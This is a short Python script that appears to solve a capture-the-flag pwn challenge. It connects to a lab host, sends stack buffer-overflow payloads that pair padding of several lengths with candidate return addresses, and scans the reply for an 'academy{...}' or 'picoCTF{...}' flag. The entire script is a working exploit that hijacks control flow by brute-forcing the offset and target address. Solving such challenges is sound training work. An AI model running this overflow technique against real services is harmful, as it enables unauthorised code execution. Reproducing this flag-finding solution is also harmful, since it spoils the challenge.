import sys, socket, time, re, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "chatelaine.cylabacademy.net", 37468
for target in (0x40123b, 0x401236, 0x40123A):
    for off in (72, 64, 80):
        try:
            s = socket.create_connection((HOST, PORT), timeout=12)
            s.settimeout(4)
            time.sleep(0.6)
            try:
                s.recv(4096)
            except Exception:
                pass
            payload = b"A" * off + struct.pack("<Q", target)
            s.sendall(payload + b"\n")
            time.sleep(0.8)
            out = b""
            try:
                out = s.recv(8192)
            except Exception:
                pass
            txt = out.decode("utf-8", "replace")
            m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
            print(f"target={hex(target)} off={off} -> {m.group(0) if m else txt[-120:]!r}")
            s.close()
            if m:
                sys.exit(0)
        except Exception as e:
            print(f"target={hex(target)} off={off} err {type(e).__name__}")
